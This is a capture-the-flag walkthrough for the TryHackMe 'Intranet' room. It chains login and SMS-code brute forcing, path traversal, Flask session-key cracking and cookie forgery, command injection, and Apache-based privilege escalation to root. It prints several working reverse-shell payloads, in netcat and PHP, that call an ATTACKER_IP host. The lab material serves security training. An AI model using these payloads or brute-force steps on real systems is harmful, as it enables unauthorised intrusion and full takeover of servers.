# [Intranet](https://tryhackme.com/room/securesolacodersintra)

## Welcome to the intranet!

# Find vulnerabilities and gain root access

The web application development company SecureSolaCoders has created their own intranet page. The developers are still very young and inexperienced, but they ensured their boss (Magnus) that the web application was secured appropriately. The developers said, "Don't worry, Magnus. We have learnt from our previous mistakes. It won't happen again". However, Magnus was not convinced, as they had introduced many strange vulnerabilities in their customers' applications earlier.

Magnus hired you as a third-party to conduct a penetration test of their web application. Can you successfully exploit the app and achieve root access?

### What is the first web application flag?

_Think about the information you have gathered so far from the web application - usernames, company name, etc. You might want to generate a password list or make educated guesses._

1. Start with an initial reconnaissance scan to enumerate open ports and running services on the target machine.

```bash
nmap -sCV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 72:c0:0d:93:54:0f:f1:cc:a0:32:81:60:d6:5a:19:d7 (RSA)
|   256 34:93:8a:1a:86:48:d4:00:eb:d9:95:11:63:8c:a9:b3 (ECDSA)
|_  256 c4:7f:d7:f1:00:68:02:de:ae:1c:27:b4:33:09:e9:af (ED25519)
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http       Werkzeug httpd 2.2.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Navigate to `http://<TARGET_IP>:8080/login`. The login page and its source reveal two usernames associated with the company domain `securesolacoders.no`. From these usernames and the company name, we can extract base words to build a targeted password list. Create `users.txt` with the discovered email addresses and `base.txt` with the meaningful words:

**users.txt:**

```
anders@securesolacoders.no
devops@securesolacoders.no
```

**base.txt:**

```
anders
devops
magnus
securesolacoders
```

3. Add a custom rule to `/etc/john/john.conf` to generate password mutations. Appending one to four digits, and optionally a special character to cover common weak password patterns used by developers:

The rule:

```conf
[List.Rules:TryHackMe-Intranet]
Az"[0-9]"
Az"[0-9][0-9]"
Az"[0-9][0-9][0-9]"
Az"[0-9][0-9][0-9][0-9]"
Az"[0-9]" $[!$§$%/()=?*@]
```

Generate the wordlist using John the Ripper with the new rule:

```bash
john -wordlist:base.txt -rules:Intranet -stdout > wordlist.txt
```

4. Use Hydra to brute force the login form at port 8080, supplying all email/password combinations. The `Error` string in the form's response identifies failed attempts:

```bash
hydra -L users.txt -P wordlist.txt <TARGET_IP> -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:Error"
```

5. Log in with the credentials found by Hydra to obtain the first flag:

[SCREEN01]

---

### What is the second web application flag?

_Research common techniques to bypass this security mechanism._

1. After a successful login, the application redirects to `http://<TARGET_IP>:8080/sms`, which presents an SMS-based two-factor authentication page expecting a 4-digit numeric code. Without access to the real SMS, we must brute force all 10,000 possible combinations. Use `crunch` to generate a complete list of 4-digit codes:

```bash
crunch 4 4 0123456789 -o 4-digits.txt
```

2. Use `wfuzz` to brute force the `sms` POST parameter, supplying the session cookie obtained after the initial login. The `--hl 77` flag filters out all responses with 77 lines, which corresponds to the failed-attempt response, leaving only the successful response visible:

```bash
wfuzz --hl 77 -w 4-digits.txt -d "sms=FUZZ" -b session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.ae0k3g.6I4Z44sj6EmxaUYWIXoa7HraI6M http://<TARGET_IP>:8080/sms
```

3. Once `wfuzz` identifies the correct 4-digit code, the application redirects to the next page which contains the second flag:

[SCREEN02]

---

### What is the third web application flag?

_The CMD will lead you to the source._

1. After bypassing 2FA, `navigate to http://<TARGET_IP>:8080/internal`. This page contains an `Update` button that sends a POST request with a file path parameter to the server, which then returns the file's contents. This is a path traversal / Local File Inclusion vulnerability. Capture the POST request using Burp Suite or a browser proxy to inspect and manipulate the parameter.

2. Send `../../../../proc/self/stat` in the payload and note the returned process ID.

[SCREEN03]

3. Using the discovered PID, read the command-line arguments of the process to confirm the application source path. Send `../../../../proc/<PID>/cmdline` in the payload. The response should return `/usr/bin/python3/home/devops/app.py`, confirming that the Flask application source is located at `/home/devops/app.py`.

4. Send `../../../../home/devops/app.py` as the path parameter to read the full application source code. The third flag is embedded within the source file:

[SCREEN04]

---

### What is the fourth web application flag?

_Get the key to the castle._

1. Examining the first lines of `app.py` retrieved in the previous step reveals that the Flask secret key is weakly generated: it is the string `secret_key_` concatenated with a random integer between `100000` and `999999`. This gives only 900,000 possible values. Small enough to brute force. We can crack the known session cookie using `flask-unsign`:

**app.py:**

```py
from flask import Flask, flash, redirect, render_template, request, session, abort, make_response, render_template_string, send_file
from time import gmtime, strftime
import jinja2, os, hashlib, random

app = Flask(__name__, template_folder="/home/devops/templates")

###############################################
###############################################

key = "secret_key_" + str(random.randrange(100000,999999))
app.secret_key = str(key).encode()
```

2. Create `flask_base.txt` containing the key prefix as the only entry, which John will use as the base word for mutation:

3. Add a new rule to the `[List.Rules:Intranet]` section in `/etc/john/john.conf` to append all 6-digit numbers starting from 1:

```conf
Az"[1-9][0-9][0-9][0-9][0-9][0-9]"
```

Generate the Flask key wordlist:

```bash
john --rules=Intranet -wordlist:flask_base.txt -stdout > flask_wordlist.txt
```

4. Run `flask-unsign` against the session cookie captured earlier to find the secret key:

```bash
flask-unsign --unsign --wordlist flask_wordlist.txt --cookie 'eyJ1c2VybmFtZSI6ImFuZGVycyJ9.ae0k3g.6I4Z44sj6EmxaUYWIXoa7HraI6M'
```

**Results:**

```
[*] Session decodes to: {'username': 'anders'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 452480 attempts
'secret_key_552434'
```

5. With the secret key known, forge a new session cookie impersonating the `admin`:

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret_key_552434'
```

6. Replace the `session` cookie in your browser with the newly generated token and navigate to `http://<TARGET_IP>:8080/admin` to access the admin panel and retrieve the fourth flag:

[SCREEN05]

---

### What is the user.txt flag?

_Have you looked at all the features?_

1. Inspect the page source at `view-source:http://<TARGET_IP>:8080/admin`. At the bottom of the page there is an unclosed `</form>` tag containing a hidden `debug` input field. This field accepts arbitrary system commands and executes them on the server. A Server-Side Command Injection vulnerability that was likely left in by a developer for debugging purposes.

2. Set up a Netcat listener on the attacking machine to catch the incoming reverse shell connection:

```bash
nc -lvnp 4444
```

3. Use `curl` to send a reverse shell payload via the `debug` parameter, supplying the forged admin session cookie:

```bash
curl 'http://<TARGET_IP>:8080/admin' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ae0xeQ.xrP1ncjp8IhjeIhGfD9vLEX-Dc8' --data-raw 'debug=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc <ATTACKER_IP> 4444 >/tmp/f'
```

4. Once the reverse shell connects retrieve the user flag:

```bash
cat user.txt
```

[SCREEN06]

---

### What is the user2.txt flag?

_Look at the running processes._

1. Enumerate the currently running processes to identify services running under other user accounts:

```bash
ps aux
```

**Results:**

```
...
anders     11932  0.0  0.4 193944  9112 ?        S    18:53   0:00 /usr/sbin/apache2 -k start
anders     11937  0.0  0.4 193944  9112 ?        S    18:53   0:00 /usr/sbin/apache2 -k start
anders     11939  0.0  0.4 193944  9112 ?        S    18:53   0:00 /usr/sbin/apache2 -k start
anders     11944  0.0  0.4 193944  9112 ?        S    18:53   0:00 /usr/sbin/apache2 -k start
anders     11961  0.0  0.4 193944  9112 ?        S    18:53   0:00 /usr/sbin/apache2 -k start
anders     11972  0.0  0.4 193944  9104 ?        S    18:53   0:00 /usr/sbin/apache2 -k start
anders     11977  0.0  0.4 193944  9112 ?        S    18:54   0:00 /usr/sbin/apache2 -k start
anders     11979  0.0  0.4 193944  9112 ?        S    18:54   0:00 /usr/sbin/apache2 -k start
anders     11980  0.0  0.4 193944  9112 ?        S    18:54   0:00 /usr/sbin/apache2 -k start
...
```

> The Apache2 worker processes are all running as user `anders`. Any PHP code executed through Apache will therefore run with `anders's` privileges.

2. Check the permissions on the Apache web root directory:

```bash
ls -lah /var/www/html
```

**Results:**

```
total 12K
drwxrwxrwx 2 root root 4.0K Nov  7  2022 .
drwxr-xr-x 3 root root 4.0K Oct 16  2022 ..
-rw-r--r-- 1 root root  111 Nov  7  2022 index.html
```

> The directory permissions are `drwxrwxrwx` world-writable. Our current user can write files directly into the web root and have them served by Apache.

3. Upgrade the current shell to a full TTY for stable interaction:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

4. Write a PHP reverse shell into the Apache web root:

```bash
cd /var/www/html
echo $'<?php\n$ip = \'<ATTACKER_IP>\';\n$port = 4445;\n\n$sock = fsockopen($ip, $port);\n$proc = proc_open(\'/bin/sh -i\', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);\n?>' > shell.php
```

5. Set up a second Netcat listener to catch the incoming connection from Apache:

```bash
nc -lvnp 4445
```

6. Trigger the reverse shell by visiting `http://<TARGET_IP>/shell.php` in a browser. Apache will execute the PHP file as user anders, giving us a shell under that account.

7. Navigate to `anders's` home directory and retrieve the second user flag:

```bash
cd /home/anders
cat user2.txt
```

[SCREEN08]

---

### What is the root.txt flag?

_What can you do as this user with the current permissions?_

1. Check the sudo privileges available to the `anders` user:

```bash
sudo -l
```

**Results:**

```
(ALL) NOPASSWD: /sbin/service apache2 restart
```

> `anders` can restart Apache2 as root without a password. This means anything executed during Apache's startup process will run as root.

2. Examine the Apache configuration directory for files we can modify:

```bash
ls -lah /etc/apache2
```

**Results:**

```
total 88K
drwxr-xr-x   8 root root 4.0K Apr 26  2025 .
drwxr-xr-x 105 root root 4.0K Apr 25 15:52 ..
-rw-r--r--   1 root root 7.1K Nov  7  2022 apache2.conf
drwxr-xr-x   2 root root 4.0K Apr 26  2025 conf-available
drwxr-xr-x   2 root root 4.0K Oct 16  2022 conf-enabled
-rw-r--rw-   1 root root 1.8K Nov  7  2022 envvars
-rw-r--r--   1 root root  31K Feb 23  2021 magic
drwxr-xr-x   2 root root  12K Apr 26  2025 mods-available
drwxr-xr-x   2 root root 4.0K Nov  6  2022 mods-enabled
-rw-r--r--   1 root root  320 Feb 23  2021 ports.conf
drwxr-xr-x   2 root root 4.0K Apr 26  2025 sites-available
drwxr-xr-x   2 root root 4.0K Oct 16  2022 sites-enabled
```

> Notice that /`etc/apache2/envvars` has permissions `-rw-r--rw-` so it is world-writable. This file is sourced by Apache during startup to set environment variables. By appending shell commands to it, they will be executed as root when Apache restarts.

3. Upgrade the shell to a full TTY for stable interaction:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

4. Append a reverse shell payload to `/etc/apache2/envvars`. This command will execute as root when Apache reads the file on restart:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4446 > /tmp/f
```

[SCREEN09]

5. Set up a Netcat listener on port `4446` on the attacking machine:

```bash
nc -lvnp 4446
```

6. Trigger the Apache restart using the allowed sudo command. The `envvars` script will be sourced as root, executing the reverse shell payload:

```bash
sudo /sbin/service apache2 restart
```

7. Once the root shell connects, retrieve the final flag:

```bash
cat /root/root.txt
```

[SCREEN10]
